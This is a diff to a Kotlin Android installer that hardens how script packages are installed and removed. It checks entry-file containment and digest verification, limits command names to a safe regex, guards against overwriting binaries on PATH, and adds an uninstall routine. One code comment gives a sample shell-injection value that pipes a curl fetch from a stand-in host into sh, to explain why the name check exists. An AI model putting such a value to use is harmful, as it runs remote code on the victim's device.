@@ -1,6 +1,7 @@
 package com.hereliesaz.hg2gui.azp
 
 import android.content.Context
+import com.hereliesaz.hg2gui.managers.AzpLibrary
 import com.hereliesaz.hg2gui.terminal.DistroManager
 import com.hereliesaz.hg2gui.terminal.TerminalEngine
 import java.io.File
@@ -32,9 +33,11 @@ object ScriptInstaller {
          *  `prefix/bin` to place a wrapper in. The package's bytes are still on disk from
          *  [AzpInstaller.install]; only becoming runnable is deferred. */
         object BootstrapMissing : Result()
-        /** The package's declared `entry` would resolve outside its own extracted/digest-verified
-         *  directory, or its declared `command` would resolve outside `prefix/bin` or collide
-         *  with a name already there - either way, nothing is written or executed. */
+        /** The package's declared `entry` is missing, isn't a digest-verified payload file inside
+         *  its own extracted directory, or its declared `command` is unsafe, would resolve outside
+         *  `prefix/bin`, or collides with a name there that isn't this package's own earlier
+         *  wrapper. These checks all run before dependency installation, so nothing is
+         *  installed, written or executed. */
         object Rejected : Result()
     }
 
@@ -47,6 +50,32 @@ object ScriptInstaller {
         if (!DistroManager.isInstalled(context)) return Result.BootstrapMissing
 
         val prefix = DistroManager.prefixDir(context)
+        val packageRoot = AzpInstaller.rootDirOrNull(context, id, version) ?: return Result.Rejected
+        val entryFile = File(packageRoot, script.entry)
+        // Must be an extracted payload file: AzpInstaller digest-checks every archive entry
+        // except manifest.json/signature.json, so any other contained regular file is verified.
+        if (!entryFile.isContainedIn(packageRoot) || !entryFile.isFile) return Result.Rejected
+        val entryRelative = entryFile.canonicalFile.relativeTo(packageRoot.canonicalFile).invariantSeparatorsPath
+        if (entryRelative in UNVERIFIED_ARCHIVE_FILES) return Result.Rejected
+
+        val command = script.command?.takeIf { it.isNotBlank() } ?: commandNameFor(script.entry)
+        // The name lands in a file path, in the generated wrapper-function profile bash sources
+        // on every login, and on the command line - a name like "x;curl evil|sh" or "-rf"
+        // would be shell injection there, so anything outside a plain identifier is refused.
+        if (!isSafeCommandName(command)) return Result.Rejected
+
+        val binDir = File(prefix, "bin")
+        val wrapper = File(binDir, command)
+        // command is package-declared, unlike entry's already-sanitized filename - it can walk
+        // out of bin/ via ../ the same way a VFS name could, or simply name itself ls/pkg/bash
+        // and overwrite whatever's already on PATH. Containment plus an existence check covers
+        // both; the one name a package may replace is its own wrapper from an earlier version
+        // (reinstall/upgrade), recognised by pointing into this package's azp/<id>/ directory.
+        if (!wrapper.isContainedIn(binDir)) return Result.Rejected
+        if ((wrapper.exists() || java.nio.file.Files.isSymbolicLink(wrapper.toPath())) && !isOwnWrapper(context, wrapper, id)) {
+            return Result.Rejected
+        }
+
         val engine = TerminalEngine(context)
         try {
             val aptPackages = script.dependencies["apt"].orEmpty()
@@ -57,29 +86,60 @@ object ScriptInstaller {
                 if (exitCode != 0) return Result.DependencyFailed(output)
             }
 
-            val packageRoot = AzpInstaller.rootDir(context, id, version)
-            val entryFile = File(packageRoot, script.entry)
-            if (!entryFile.isContainedIn(packageRoot)) return Result.Rejected
-
-            val command = script.command?.takeIf { it.isNotBlank() } ?: commandNameFor(script.entry)
             val interpreter = resolveOnPrefix(prefix, script.interpreter)
             val argsSuffix = script.args.joinToString("") { " " + it.shellQuoted() }
-
-            val binDir = File(prefix, "bin")
-            val wrapper = File(binDir, command)
-            // command is package-declared, unlike entry's already-sanitized filename - it can walk
-            // out of bin/ via ../ the same way a VFS name could, or simply name itself ls/pkg/bash
-            // and overwrite whatever's already on PATH. Containment plus a plain existence check
-            // covers both: a package never gets to replace a binary it didn't itself just install.
-            if (!wrapper.isContainedIn(binDir) || wrapper.exists()) return Result.Rejected
-            wrapper.writeText(
-                "#!${File(prefix, "bin/bash").absolutePath}\n" +
-                    "exec ${interpreter.shellQuoted()} ${entryFile.absolutePath.shellQuoted()}$argsSuffix \"\$@\"\n"
-            )
-            wrapper.setExecutable(true)
+            try {
+                wrapper.writeText(
+                    "#!${File(prefix, "bin/bash").absolutePath}\n" +
+                        "exec ${interpreter.shellQuoted()} ${entryFile.absolutePath.shellQuoted()}$argsSuffix \"\$@\"\n"
+                )
+                if (!wrapper.setExecutable(true)) {
+                    wrapper.delete()
+                    return Result.Rejected
+                }
+            } catch (e: java.io.IOException) {
+                wrapper.delete()
+                return Result.Rejected
+            }
             return Result.Installed(command)
         } finally {
             engine.destroy()
+        }
+    }
+
+    /**
+     * Removes an installed package: its PATH wrapper (only if it is still this package's own),
+     * its extracted files under `filesDir/azp/<id>/`, and its [AzpLibrary] record. Dependencies
+     * installed through `pkg` are left alone - other packages or the user may rely on them.
+     */
+    fun uninstall(context: Context, id: String) {
+        if (!isValidAzpPathSegment(id)) return
+        AzpLibrary.scriptCommand(context, id)?.takeIf { isSafeCommandName(it) }?.let { command ->
+            val binDir = File(DistroManager.prefixDir(context), "bin")
+            val wrapper = File(binDir, command)
+            if (wrapper.isContainedIn(binDir) && isOwnWrapper(context, wrapper, id)) wrapper.delete()
+        }
+        packageDir(context, id)?.deleteRecursively()
+        AzpLibrary.remove(context, id)
+    }
+
+    private val UNVERIFIED_ARCHIVE_FILES = setOf("manifest.json", "signature.json")
+
+    /** `filesDir/azp/<id>/`, or null for an id that isn't a plain path segment. */
+    private fun packageDir(context: Context, id: String): File? {
+        if (!isValidAzpPathSegment(id)) return null
+        val azpRoot = File(context.filesDir, "azp").canonicalFile
+        return File(azpRoot, id).canonicalFile.takeIf { it.path.startsWith(azpRoot.path + File.separator) }
+    }
+
+    /** True iff [wrapper] is a regular file this installer wrote for package [id]: its exec line
+     *  quotes an entry path inside `azp/<id>/`. Anything else on PATH is never replaced. */
+    private fun isOwnWrapper(context: Context, wrapper: File, id: String): Boolean {
+        if (!java.nio.file.Files.isRegularFile(wrapper.toPath(), java.nio.file.LinkOption.NOFOLLOW_LINKS)) return false
+        val dir = packageDir(context, id) ?: return false
+        val text = runCatching { wrapper.readText() }.getOrNull() ?: return false
+        return text.lineSequence().any { line ->
+            line.startsWith("exec ") && line.contains(" '" + dir.absolutePath + File.separator)
         }
     }
 
@@ -98,6 +158,15 @@ object ScriptInstaller {
  *  Android runtime - see ScriptInstallerTest. */
 internal fun commandNameFor(entry: String): String =
     File(entry).nameWithoutExtension.ifBlank { "script" }
+
+private val SAFE_COMMAND_NAME = Regex("^[A-Za-z0-9._][A-Za-z0-9._-]{0,63}$")
+
+/** True iff [name] is safe to use as a `prefix/bin` file name and as a bash function name in the
+ *  generated wrapper profile: letters, digits, `.`, `_`, `-` only, no leading `-` (would parse as
+ *  an option), no `/`, at most 64 chars, and not `.`/`..`. Pure for the same testability reason
+ *  as [commandNameFor]; [DistroManager]'s profile writer applies the same rule. */
+internal fun isSafeCommandName(name: String): Boolean =
+    name != "." && name != ".." && SAFE_COMMAND_NAME.matches(name)
 
 /** Single-quotes [this] for safe interpolation into a generated shell wrapper, escaping any
  *  embedded single quote the POSIX-shell way (`'\''`). Pure and Context-free for the same
